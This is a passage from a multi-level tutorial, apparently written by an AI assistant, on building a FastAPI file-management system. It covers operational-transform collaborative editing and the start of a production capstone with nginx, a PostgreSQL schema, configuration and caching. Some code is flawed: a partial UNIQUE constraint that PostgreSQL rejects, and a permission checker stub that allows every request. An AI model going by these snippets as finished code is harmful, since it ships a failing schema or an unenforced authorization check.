            transformed_op = transform(transformed_op, historical_op, priority='right')

        # Apply to document
        self.content = apply_operation(self.content, transformed_op)

        # Add to history
        self.version += 1
        self.operations.append(transformed_op)

        # Broadcast to other clients
        await self.broadcast(client_id, {
            'type': 'operation',
            'operation': {
                'type': transformed_op.type,
                'position': transformed_op.position,
                'content': transformed_op.content,
                'length': transformed_op.length
            },
            'version': self.version
        })

        return {
            'version': self.version,
            'operation': transformed_op
        }

    async def broadcast(self, sender_id: str, message: dict):
        """Send message to all clients except sender."""
        tasks = []

        for client_id, connection in self.connected_clients.items():
            if client_id != sender_id:
                tasks.append(connection.send_json(message))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def add_client(self, client_id: str, connection: WebSocket):
        """Add client connection."""
        self.connected_clients[client_id] = connection

        # Send current state
        await connection.send_json({
            'type': 'init',
            'content': self.content,
            'version': self.version
        })

    def remove_client(self, client_id: str):
        """Remove client connection."""
        self.connected_clients.pop(client_id, None)

class DocumentManager:
    """Manage multiple collaborative documents."""

    def __init__(self):
        self.documents = {}  # doc_id → CollaborativeDocument

    def get_document(self, doc_id: str) -> CollaborativeDocument:
        """Get or create document."""
        if doc_id not in self.documents:
            self.documents[doc_id] = CollaborativeDocument(doc_id)
        return self.documents[doc_id]

    async def handle_client(self, websocket: WebSocket, client_id: str, doc_id: str):
        """Handle WebSocket connection for collaborative editing."""
        document = self.get_document(doc_id)
        await document.add_client(client_id, websocket)

        try:
            while True:
                message = await websocket.receive_json()

                if message['type'] == 'operation':
                    op_data = message['operation']
                    operation = Operation(
                        type=op_data['type'],
                        position=op_data['position'],
                        content=op_data.get('content', ''),
                        length=op_data.get('length', 0)
                    )

                    client_version = message['version']

                    result = await document.apply_operation(
                        client_id,
                        operation,
                        client_version
                    )

                    # Send acknowledgment
                    await websocket.send_json({
                        'type': 'ack',
                        'version': result['version']
                    })

        except Exception as e:
            print(f"Client {client_id} error: {e}")

        finally:
            document.remove_client(client_id)

# Usage:
doc_manager = DocumentManager()

@app.websocket("/ws/edit/{doc_id}")
async def collaborative_edit(websocket: WebSocket, doc_id: str, client_id: str):
    await websocket.accept()
    await doc_manager.handle_client(websocket, client_id, doc_id)
```

**Client-Side Editor:**

```javascript
class CollaborativeEditor {
  constructor(docId, clientId) {
    this.docId = docId;
    this.clientId = clientId;
    this.content = "";
    this.version = 0;
    this.pendingOps = []; // Operations sent but not acked
    this.buffer = []; // Operations made while waiting for ack

    this.ws = new WebSocket(
      `ws://localhost:8000/ws/edit/${docId}?client_id=${clientId}`
    );
    this.setupWebSocket();
  }

  setupWebSocket() {
    this.ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      this.handleMessage(message);
    };
  }

  handleMessage(message) {
    if (message.type === "init") {
      // Initial document state
      this.content = message.content;
      this.version = message.version;
      this.updateUI();
    } else if (message.type === "operation") {
      // Remote operation
      const op = this.parseOperation(message.operation);

      // Transform against pending operations
      let transformed = op;
      for (const pendingOp of this.pendingOps) {
        transformed = this.transform(transformed, pendingOp);
      }

      // Apply
      this.content = this.applyOperation(this.content, transformed);
      this.version = message.version;
      this.updateUI();
    } else if (message.type === "ack") {
      // Operation acknowledged
      this.version = message.version;

      if (this.pendingOps.length > 0) {
        this.pendingOps.shift();
      }

      // Send buffered operations
      if (this.buffer.length > 0 && this.pendingOps.length === 0) {
        const op = this.buffer.shift();
        this.sendOperation(op);
      }
    }
  }

  localInsert(position, text) {
    // User types
    const operation = {
      type: "insert",
      position: position,
      content: text,
    };

    // Apply locally immediately (optimistic)
    this.content = this.applyOperation(this.content, operation);
    this.updateUI();

    // Send to server
    if (this.pendingOps.length === 0) {
      this.sendOperation(operation);
    } else {
      // Wait for pending operation to be acked
      this.buffer.push(operation);
    }
  }

  sendOperation(operation) {
    this.pendingOps.push(operation);

    this.ws.send(
      JSON.stringify({
        type: "operation",
        operation: operation,
        version: this.version,
      })
    );
  }

  applyOperation(text, op) {
    if (op.type === "insert") {
      return text.slice(0, op.position) + op.content + text.slice(op.position);
    } else if (op.type === "delete") {
      return text.slice(0, op.position) + text.slice(op.position + op.length);
    }
    return text;
  }

  transform(op1, op2) {
    // Simplified transform (use full implementation in production)
    if (op1.type === "insert" && op2.type === "insert") {
      if (op1.position < op2.position) {
        return op1;
      } else if (op1.position > op2.position) {
        return {
          ...op1,
          position: op1.position + op2.content.length,
        };
      } else {
        // Same position - this client's operation comes second
        return {
          ...op1,
          position: op1.position + op2.content.length,
        };
      }
    }
    return op1;
  }

  updateUI() {
    document.getElementById("editor").value = this.content;
  }
}

// Usage:
const editor = new CollaborativeEditor("doc123", "user-" + Math.random());

document.getElementById("editor").addEventListener("input", (e) => {
  // Simplified - would need to track cursor position and changes
  const newText = e.target.value;
  // Compute diff and generate operations
  // editor.localInsert(position, insertedText);
});
```

---

### **Practice Exercise 1: Implement Cursor Synchronization**

```python
class CursorPosition:
    """
    Track cursor position in collaborative editor.

    Challenge: Cursor positions must be transformed along with text operations
    """

    def __init__(self, user_id: str, position: int):
        self.user_id = user_id
        self.position = position

    def transform(self, operation: Operation) -> 'CursorPosition':
        """
        Transform cursor position for an operation.

        Rules:
        - Insert before cursor: shift cursor forward
        - Insert after cursor: no change
        - Delete before cursor: shift cursor back
        - Delete at cursor: move to delete position
        """
        # Your implementation
        pass

# Solution:
class CursorPosition:
    def __init__(self, user_id: str, position: int):
        self.user_id = user_id
        self.position = position

    def transform(self, operation: Operation) -> 'CursorPosition':
        new_position = self.position

        if operation.type == 'insert':
            if operation.position <= self.position:
                # Insert before or at cursor - shift forward
                new_position += len(operation.content)

        elif operation.type == 'delete':
            if operation.position < self.position:
                if operation.position + operation.length <= self.position:
                    # Delete entirely before cursor - shift back
                    new_position -= operation.length
                else:
                    # Delete includes cursor position - move to delete start
                    new_position = operation.position

        return CursorPosition(self.user_id, new_position)

class CursorManager:
    """Manage cursors for all users."""

    def __init__(self):
        self.cursors = {}  # user_id → CursorPosition

    def update_cursor(self, user_id: str, position: int):
        """User moved cursor."""
        self.cursors[user_id] = CursorPosition(user_id, position)

    def transform_all(self, operation: Operation, except_user: str = None):
        """Transform all cursors for an operation."""
        for user_id, cursor in self.cursors.items():
            if user_id != except_user:
                self.cursors[user_id] = cursor.transform(operation)

    async def broadcast_cursors(self, manager: ConnectionManager):
        """Send cursor positions to all clients."""
        cursor_data = {
            user_id: cursor.position
            for user_id, cursor in self.cursors.items()
        }

        await manager.broadcast({
            'type': 'cursors',
            'cursors': cursor_data
        })
```

---

### **Practice Exercise 2: Implement Undo/Redo in Collaborative Context**

```python
class UndoManager:
    """
    Undo/Redo for collaborative editing.

    Challenge: Undo must be transformed against concurrent operations

    Algorithm:
    1. Store history of local operations
    2. To undo: Generate inverse operation
    3. Transform inverse against operations since original
    4. Apply transformed inverse
    """

    def __init__(self, site_id: str):
        self.site_id = site_id
        self.done_stack = []  # Operations we've done
        self.undone_stack = []  # Operations we've undone

    def do_operation(self, operation: Operation):
        """Record operation for undo."""
        self.done_stack.append(operation)
        self.undone_stack.clear()  # Clear redo stack

    def undo(self) -> Optional[Operation]:
        """
        Generate undo operation.

        Returns: Inverse operation to send
        """
        # Your implementation
        pass

    def redo(self) -> Optional[Operation]:
        """Generate redo operation."""
        # Your implementation
        pass

# Solution:
class UndoManager:
    def __init__(self, site_id: str):
        self.site_id = site_id
        self.done_stack = []
        self.undone_stack = []

    def do_operation(self, operation: Operation):
        self.done_stack.append(operation)
        self.undone_stack.clear()

    def undo(self) -> Optional[Operation]:
        if not self.done_stack:
            return None

        operation = self.done_stack.pop()
        self.undone_stack.append(operation)

        # Generate inverse
        inverse = self._inverse(operation)

        return inverse

    def redo(self) -> Optional[Operation]:
        if not self.undone_stack:
            return None

        operation = self.undone_stack.pop()
        self.done_stack.append(operation)

        # Re-apply original operation (or inverse of inverse)
        return operation

    def _inverse(self, operation: Operation) -> Operation:
        """Generate inverse operation."""
        if operation.type == 'insert':
            # Inverse of insert is delete
            return Operation(
                type='delete',
                position=operation.position,
                length=len(operation.content)
            )

        elif operation.type == 'delete':
            # Inverse of delete is insert
            # Problem: Need to remember deleted content!
            # In production, store content with operation
            return Operation(
                type='insert',
                position=operation.position,
                content=operation.content  # Assumes we stored this
            )

        return operation
```

---

Ready for the final level (19) when you're ready. The last level will be a capstone that ties everything together: building a complete production-ready file management system with all the concepts we've covered, deployment strategies, monitoring, and scaling considerations.

## **Level 19 (FINAL): Production System - Architecture, Deployment & Scale**

**Capstone:** Your tutorial has taught individual concepts. Now we integrate everything into a production-ready system with proper architecture, deployment, monitoring, and scaling strategies.

**Depth Needed:** This is where theory meets production reality. We'll cover the complete architecture, deployment pipelines, monitoring systems, database strategies, caching layers, and the operational considerations that separate a toy project from a system handling millions of users.

---

### **Part 1: System Architecture - The Complete Picture**

**Production Architecture Diagram:**

```
┌─────────────────────────────────────────────────────────────┐
│                        Load Balancer                        │
│                     (nginx/HAProxy)                         │
│                 - SSL Termination                           │
│                 - Rate Limiting                             │
│                 - Request Routing                           │
└─────────┬──────────────────────┬────────────────────────────┘
          │                      │
          │ HTTP                 │ WebSocket
          ↓                      ↓
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  FastAPI App 1  │    │  FastAPI App 2  │    │  FastAPI App N  │
│  - REST API     │    │  - REST API     │    │  - REST API     │
│  - WebSocket    │    │  - WebSocket    │    │  - WebSocket    │
└────────┬────────┘    └────────┬────────┘    └────────┬────────┘
         │                      │                       │
         └──────────────────────┴───────────────────────┘
                                │
                 ┌──────────────┼──────────────┐
                 │              │              │
         ┌───────▼──────┐  ┌───▼────┐  ┌─────▼──────┐
         │  PostgreSQL  │  │ Redis  │  │  MinIO/S3  │
         │  - Metadata  │  │ - Cache│  │ - Files    │
         │  - Users     │  │ - Pub  │  │ - Blobs    │
         │  - Locks     │  │   Sub  │  │            │
         └──────────────┘  └────────┘  └────────────┘
                                │
                         ┌──────▼──────┐
                         │  Monitoring │
                         │  - Prometheus│
                         │  - Grafana  │
                         │  - Logging  │
                         └─────────────┘
```

**Component Responsibilities:**

```python
# Layer 1: Load Balancer (nginx.conf)
"""
upstream fastapi_backend {
    least_conn;  # Use least connections algorithm
    server app1:8000 weight=1 max_fails=3 fail_timeout=30s;
    server app2:8000 weight=1 max_fails=3 fail_timeout=30s;
    server app3:8000 weight=1 max_fails=3 fail_timeout=30s;
}

# HTTP/HTTPS configuration
server {
    listen 443 ssl http2;
    server_name api.example.com;

    # SSL Configuration
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
    limit_req zone=api_limit burst=20 nodelay;

    # Regular HTTP endpoints
    location /api/ {
        proxy_pass http://fastapi_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    # WebSocket endpoints
    location /ws/ {
        proxy_pass http://fastapi_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;

        # WebSocket timeouts
        proxy_connect_timeout 7d;
        proxy_send_timeout 7d;
        proxy_read_timeout 7d;
    }
}
"""

# Layer 2: Application Server
# See complete implementation below

# Layer 3: Data Layer
"""
PostgreSQL: Relational data, ACID transactions
Redis: Caching, pub/sub, session storage
MinIO/S3: Object storage for files
"""
```

---

### **Part 2: Database Schema - Production Design**

**Complete PostgreSQL Schema:**

```sql
-- Enable extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pg_trgm";  -- For fuzzy text search

-- Users table
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    email VARCHAR(255) UNIQUE NOT NULL,
    username VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(50) NOT NULL DEFAULT 'user',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP WITH TIME ZONE,
    is_active BOOLEAN DEFAULT TRUE,

    -- Indexes
    CONSTRAINT valid_email CHECK (email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$'),
    CONSTRAINT valid_role CHECK (role IN ('user', 'admin', 'viewer'))
);

CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_username ON users(username);
CREATE INDEX idx_users_role ON users(role);

-- Files table
CREATE TABLE files (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    filename VARCHAR(255) NOT NULL,
    original_filename VARCHAR(255) NOT NULL,
    storage_path TEXT NOT NULL,
    mime_type VARCHAR(100),
    size_bytes BIGINT NOT NULL,
    checksum_sha256 CHAR(64) NOT NULL,

    uploaded_by UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    uploaded_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,

    -- Metadata
    description TEXT,
    tags TEXT[],

    -- Versioning
    version INTEGER DEFAULT 1,
    parent_version UUID REFERENCES files(id),

    -- Soft delete
    deleted_at TIMESTAMP WITH TIME ZONE,

    CONSTRAINT unique_active_filename UNIQUE (filename) WHERE deleted_at IS NULL
);

CREATE INDEX idx_files_filename ON files(filename);
CREATE INDEX idx_files_uploaded_by ON files(uploaded_by);
CREATE INDEX idx_files_checksum ON files(checksum_sha256);
CREATE INDEX idx_files_tags ON files USING GIN(tags);
CREATE INDEX idx_files_deleted ON files(deleted_at) WHERE deleted_at IS NULL;

-- Full-text search on filename and description
CREATE INDEX idx_files_search ON files USING GIN(
    to_tsvector('english', filename || ' ' || COALESCE(description, ''))
);

-- File locks table
CREATE TABLE file_locks (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    file_id UUID NOT NULL REFERENCES files(id) ON DELETE CASCADE,
    locked_by UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    locked_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
    message TEXT,

    CONSTRAINT one_lock_per_file UNIQUE (file_id)
);

CREATE INDEX idx_locks_file ON file_locks(file_id);
CREATE INDEX idx_locks_user ON file_locks(locked_by);
CREATE INDEX idx_locks_expires ON file_locks(expires_at);

-- Revisions table
CREATE TABLE file_revisions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    file_id UUID NOT NULL REFERENCES files(id) ON DELETE CASCADE,
    revision_number INTEGER NOT NULL,
    storage_path TEXT NOT NULL,
    size_bytes BIGINT NOT NULL,
    checksum_sha256 CHAR(64) NOT NULL,

    created_by UUID NOT NULL REFERENCES users(id),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    commit_message TEXT,

    CONSTRAINT unique_file_revision UNIQUE (file_id, revision_number)
);

CREATE INDEX idx_revisions_file ON file_revisions(file_id, revision_number DESC);

-- Sharing/permissions table
CREATE TABLE file_permissions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    file_id UUID NOT NULL REFERENCES files(id) ON DELETE CASCADE,
    user_id UUID REFERENCES users(id) ON DELETE CASCADE,
    permission_type VARCHAR(20) NOT NULL,  -- 'read', 'write', 'delete'
    granted_by UUID NOT NULL REFERENCES users(id),
    granted_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP WITH TIME ZONE,

    CONSTRAINT valid_permission CHECK (permission_type IN ('read', 'write', 'delete'))
);

CREATE INDEX idx_permissions_file ON file_permissions(file_id);
CREATE INDEX idx_permissions_user ON file_permissions(user_id);

-- Audit log
CREATE TABLE audit_log (
    id BIGSERIAL PRIMARY KEY,
    user_id UUID REFERENCES users(id) ON DELETE SET NULL,
    action VARCHAR(100) NOT NULL,
    resource_type VARCHAR(50) NOT NULL,
    resource_id UUID,
    ip_address INET,
    user_agent TEXT,
    details JSONB,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_audit_user ON audit_log(user_id, timestamp DESC);
CREATE INDEX idx_audit_resource ON audit_log(resource_type, resource_id);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp DESC);
CREATE INDEX idx_audit_details ON audit_log USING GIN(details);

-- Settings/configuration table
CREATE TABLE settings (
    key VARCHAR(100) PRIMARY KEY,
    value JSONB NOT NULL,
    description TEXT,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    updated_by UUID REFERENCES users(id)
);

-- Triggers for updated_at
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = CURRENT_TIMESTAMP;
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_users_updated_at BEFORE UPDATE ON users
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

CREATE TRIGGER update_settings_updated_at BEFORE UPDATE ON settings
    FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- Views for common queries
CREATE VIEW active_files AS
SELECT
    f.*,
    u.username as uploaded_by_username,
    u.email as uploaded_by_email,
    fl.locked_by as locked_by_user_id,
    lu.username as locked_by_username,
    fl.locked_at,
    fl.expires_at as lock_expires_at
FROM files f
JOIN users u ON f.uploaded_by = u.id
LEFT JOIN file_locks fl ON f.id = fl.file_id
LEFT JOIN users lu ON fl.locked_by = lu.id
WHERE f.deleted_at IS NULL;

-- Materialized view for statistics (refresh periodically)
CREATE MATERIALIZED VIEW file_statistics AS
SELECT
    DATE_TRUNC('day', uploaded_at) as date,
    COUNT(*) as files_uploaded,
    SUM(size_bytes) as total_bytes,
    AVG(size_bytes) as avg_file_size,
    uploaded_by,
    u.username
FROM files f
JOIN users u ON f.uploaded_by = u.id
WHERE f.deleted_at IS NULL
GROUP BY DATE_TRUNC('day', uploaded_at), uploaded_by, u.username;

CREATE INDEX idx_file_stats_date ON file_statistics(date DESC);

-- Refresh function (call from cron or scheduled task)
CREATE OR REPLACE FUNCTION refresh_file_statistics()
RETURNS void AS $$
BEGIN
    REFRESH MATERIALIZED VIEW CONCURRENTLY file_statistics;
END;
$$ LANGUAGE plpgsql;
```

**Database Migrations with Alembic:**

```python
# alembic/versions/001_initial_schema.py
"""Initial schema

Revision ID: 001
Create Date: 2025-10-03
"""
from alembic import op
import sqlalchemy as sa
from sqlalchemy.dialects import postgresql

revision = '001'
down_revision = None
branch_labels = None
depends_on = None

def upgrade():
    # Enable extensions
    op.execute('CREATE EXTENSION IF NOT EXISTS "uuid-ossp"')
    op.execute('CREATE EXTENSION IF NOT EXISTS "pg_trgm"')

    # Create users table
    op.create_table(
        'users',
        sa.Column('id', postgresql.UUID(as_uuid=True), primary_key=True,
                  server_default=sa.text('uuid_generate_v4()')),
        sa.Column('email', sa.String(255), nullable=False, unique=True),
        sa.Column('username', sa.String(100), nullable=False, unique=True),
        sa.Column('password_hash', sa.String(255), nullable=False),
        sa.Column('role', sa.String(50), nullable=False, server_default='user'),
        sa.Column('created_at', sa.TIMESTAMP(timezone=True),
                  server_default=sa.text('CURRENT_TIMESTAMP')),
        sa.Column('updated_at', sa.TIMESTAMP(timezone=True),
                  server_default=sa.text('CURRENT_TIMESTAMP')),
        sa.Column('last_login', sa.TIMESTAMP(timezone=True)),
        sa.Column('is_active', sa.Boolean(), server_default='true'),
        sa.CheckConstraint(
            "email ~* '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$'",
            name='valid_email'
        ),
        sa.CheckConstraint(
            "role IN ('user', 'admin', 'viewer')",
            name='valid_role'
        )
    )

    # Create indexes
    op.create_index('idx_users_email', 'users', ['email'])
    op.create_index('idx_users_username', 'users', ['username'])

    # ... rest of tables

def downgrade():
    # Drop in reverse order due to foreign keys
    op.drop_table('audit_log')
    op.drop_table('file_permissions')
    op.drop_table('file_revisions')
    op.drop_table('file_locks')
    op.drop_table('files')
    op.drop_table('users')

    op.execute('DROP EXTENSION IF EXISTS "pg_trgm"')
    op.execute('DROP EXTENSION IF EXISTS "uuid-ossp"')
```

---

### **Part 3: Application Structure - Clean Architecture**

**Project Structure:**

```
project/
├── alembic/                    # Database migrations
│   ├── versions/
│   └── env.py
├── app/
│   ├── __init__.py
│   ├── main.py                # FastAPI app initialization
│   ├── config.py              # Configuration management
│   ├── dependencies.py        # Dependency injection
│   │
│   ├── api/                   # API endpoints
│   │   ├── v1/
│   │   │   ├── __init__.py
│   │   │   ├── files.py       # File endpoints
│   │   │   ├── auth.py        # Authentication
│   │   │   ├── users.py       # User management
│   │   │   └── websocket.py   # WebSocket endpoints
│   │   └── deps.py            # API dependencies
│   │
│   ├── core/                  # Business logic
│   │   ├── __init__.py
│   │   ├── auth.py           # Authentication logic
│   │   ├── security.py       # Password hashing, tokens
│   │   ├── permissions.py    # Authorization logic
│   │   └── storage.py        # File storage abstraction
│   │
│   ├── db/                   # Database layer
│   │   ├── __init__.py
│   │   ├── base.py          # SQLAlchemy base
│   │   ├── session.py       # Database session
│   │   └── models/          # SQLAlchemy models
│   │       ├── __init__.py
│   │       ├── user.py
│   │       ├── file.py
│   │       └── audit.py
│   │
│   ├── schemas/              # Pydantic schemas
│   │   ├── __init__.py
│   │   ├── user.py
│   │   ├── file.py
│   │   └── token.py
│   │
│   ├── services/             # Business services
│   │   ├── __init__.py
│   │   ├── file_service.py
│   │   ├── user_service.py
│   │   ├── lock_service.py
│   │   └── revision_service.py
│   │
│   ├── utils/                # Utilities
│   │   ├── __init__.py
│   │   ├── cache.py
│   │   ├── logging.py
│   │   └── validators.py
│   │
│   └── workers/              # Background tasks
│       ├── __init__.py
│       ├── cleanup.py       # Periodic cleanup
│       └── notifications.py  # Send notifications
│
├── tests/                    # Test suite
│   ├── unit/
│   ├── integration/
│   └── e2e/
│
├── docker/                   # Docker configurations
│   ├── Dockerfile
│   ├── docker-compose.yml
│   └── docker-compose.prod.yml
│
├── kubernetes/               # K8s manifests
│   ├── deployment.yaml
│   ├── service.yaml
│   └── ingress.yaml
│
├── monitoring/               # Monitoring configs
│   ├── prometheus.yml
│   └── grafana/
│
├── scripts/                  # Utility scripts
│   ├── migrate.sh
│   ├── seed_db.py
│   └── backup.sh
│
├── .env.example
├── .gitignore
├── requirements.txt
├── pyproject.toml
└── README.md
```

**Configuration Management:**

```python
# app/config.py
from pydantic_settings import BaseSettings
from typing import Optional, List
from functools import lru_cache

class Settings(BaseSettings):
    """
    Application settings with environment variable support.

    Loads from:
    1. Environment variables
    2. .env file
    3. Default values
    """

    # Application
    APP_NAME: str = "File Manager API"
    APP_VERSION: str = "1.0.0"
    DEBUG: bool = False
    ENVIRONMENT: str = "production"

    # API
    API_V1_PREFIX: str = "/api/v1"
    ALLOWED_HOSTS: List[str] = ["*"]
    CORS_ORIGINS: List[str] = []

    # Security
    SECRET_KEY: str  # Must be provided
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 30
    REFRESH_TOKEN_EXPIRE_DAYS: int = 7
    ALGORITHM: str = "HS256"

    # Database
    DATABASE_URL: str
    DATABASE_POOL_SIZE: int = 20
    DATABASE_MAX_OVERFLOW: int = 40
    DATABASE_POOL_TIMEOUT: int = 30
    DATABASE_POOL_RECYCLE: int = 3600

    # Redis
    REDIS_URL: str = "redis://localhost:6379/0"
    REDIS_CACHE_TTL: int = 3600

    # Storage
    STORAGE_BACKEND: str = "s3"  # "local", "s3", "minio"
    STORAGE_LOCAL_PATH: str = "./uploads"

    # S3/MinIO
    S3_ENDPOINT: Optional[str] = None
    S3_ACCESS_KEY: Optional[str] = None
    S3_SECRET_KEY: Optional[str] = None
    S3_BUCKET: str = "files"
    S3_REGION: str = "us-east-1"

    # File constraints
    MAX_FILE_SIZE: int = 100 * 1024 * 1024  # 100 MB
    ALLOWED_EXTENSIONS: List[str] = [".pdf", ".jpg", ".png", ".mcam"]

    # Rate limiting
    RATE_LIMIT_ENABLED: bool = True
    RATE_LIMIT_PER_MINUTE: int = 60

    # Monitoring
    ENABLE_METRICS: bool = True
    SENTRY_DSN: Optional[str] = None

    # Logging
    LOG_LEVEL: str = "INFO"
    LOG_FORMAT: str = "json"

    class Config:
        env_file = ".env"
        case_sensitive = True

@lru_cache()
def get_settings() -> Settings:
    """
    Get cached settings instance.

    Uses lru_cache to ensure single instance.
    """
    return Settings()

# Usage:
# from app.config import get_settings
# settings = get_settings()
```

**Dependency Injection:**

```python
# app/dependencies.py
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from sqlalchemy.orm import Session
from app.db.session import get_db
from app.core.auth import verify_token
from app.db.models.user import User
from app.config import get_settings
import redis.asyncio as redis
from typing import Optional

security = HTTPBearer()
settings = get_settings()

# Redis connection pool
_redis_pool = None

async def get_redis() -> redis.Redis:
    """Get Redis connection."""
    global _redis_pool
    if _redis_pool is None:
        _redis_pool = redis.ConnectionPool.from_url(
            settings.REDIS_URL,
            max_connections=20,
            decode_responses=True
        )

    return redis.Redis(connection_pool=_redis_pool)

async def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(security),
    db: Session = Depends(get_db)
) -> User:
    """
    Get current authenticated user.

    Validates JWT token and returns user object.
    """
    token = credentials.credentials

    try:
        payload = verify_token(token)
        user_id = payload.get("sub")

        if user_id is None:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid authentication credentials"
            )

        user = db.query(User).filter(User.id == user_id).first()

        if user is None or not user.is_active:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="User not found or inactive"
            )

        return user

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials"
        )

def get_current_active_user(
    current_user: User = Depends(get_current_user)
) -> User:
    """Ensure user is active."""
    if not current_user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Inactive user"
        )
    return current_user

def require_admin(
    current_user: User = Depends(get_current_active_user)
) -> User:
    """Require admin role."""
    if current_user.role != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Admin privileges required"
        )
    return current_user

def require_permission(permission: str):
    """
    Create dependency that requires specific permission.

    Usage:
    @app.get("/files/{file_id}", dependencies=[Depends(require_permission("read"))])
    """
    def permission_checker(
        current_user: User = Depends(get_current_active_user),
        db: Session = Depends(get_db)
    ) -> User:
        # Check if user has permission
        # (Implementation depends on permission model)
        return current_user

    return permission_checker
```

---

### **Part 4: Caching Strategy - Multi-Layer Cache**

**Cache Architecture:**

```python
# app/utils/cache.py
from typing import Optional, Callable, Any
import json
import hashlib
from functools import wraps
from app.dependencies import get_redis
from app.config import get_settings
import pickle

settings = get_settings()

class CacheManager:
    """
    Multi-layer caching with Redis.

    Layers:
    1. Local in-memory cache (per-process)
    2. Redis cache (shared across processes)
    3. Database (source of truth)
    """

    def __init__(self):
        self._local_cache = {}
        self._local_cache_max_size = 1000

    async def get(self, key: str) -> Optional[Any]:
        """
        Get value from cache.

        Checks local cache first, then Redis.
        """
        # Layer 1: Local cache
        if key in self._local_cache:
            return self._local_cache[key]

        # Layer 2: Redis cache
        redis_client = await get_redis()

        try:
            value = await redis_client.get(key)
            if value:
                # Deserialize
                data = json.loads(value)

                # Store in local cache
                self._set_local(key, data)

                return data
        except Exception as e:
            print(f"Redis error: {e}")

        return None

    async def set(self, key: str, value: Any, ttl: int = None) -> None:
        """
        Set value in cache.

        Writes to both local and Redis cache.
        """
        # Serialize
        serialized = json.dumps(value)

        # Layer 1: Local cache
        self._set_local(key, value)

        # Layer 2: Redis cache
        redis_client = await get_redis()

        try:
            if ttl:
                await redis_client.setex(key, ttl, serialized)
            else:
                await redis_client.set(key, serialized)
        except Exception as e:
            print(f"Redis error: {e}")

    async def delete(self, key: str) -> None:
        """Delete from all cache layers."""
        # Local
        self._local_cache.pop(key, None)

        # Redis
        redis_client = await get_redis()
        try:
            await redis_client.delete(key)
        except Exception as e:
            print(f"Redis error: {e}")

    async def invalidate_pattern(self, pattern: str) -> None:
        """
        Invalidate all keys matching pattern.

        Example: invalidate_pattern("user:123:*")
        """
        # Clear matching keys from local cache
        keys_to_delete = [k for k in self._local_cache if self._matches_pattern(k, pattern)]
        for key in keys_to_delete:
            del self._local_cache[key]

        # Clear from Redis
        redis_client = await get_redis()
        try:
            cursor = 0
            while True:
                cursor, keys = await redis_client.scan(cursor, match=pattern, count=100)
                if keys:
                    await redis_client.delete(*keys)
                if cursor == 0:
                    break
        except Exception as e:
            print(f"Redis error: {e}")

    def _set_local(self, key: str, value: Any):
        """Set in local cache with size limit."""
        if len(self._local_cache) >= self._local_cache_max_size:
            # Evict oldest (simple LRU approximation)
            first_key = next(iter(self._local_cache))
            del self._local_cache[first_key]

        self._local_cache[key] = value

    def _matches_pattern(self, key: str, pattern: str) -> bool:
        """Check if key matches wildcard pattern."""
        import re
        regex_pattern = pattern.replace('*', '.*').replace('?', '.')
        return re.match(f'^{regex_pattern}$', key) is not None

# Global cache manager
cache = CacheManager()

def cached(
    key_prefix: str,
    ttl: int = 3600,
    key_builder: Optional[Callable] = None
):
    """
    Decorator for caching function results.

    Usage:
    @cached(key_prefix="user", ttl=300)
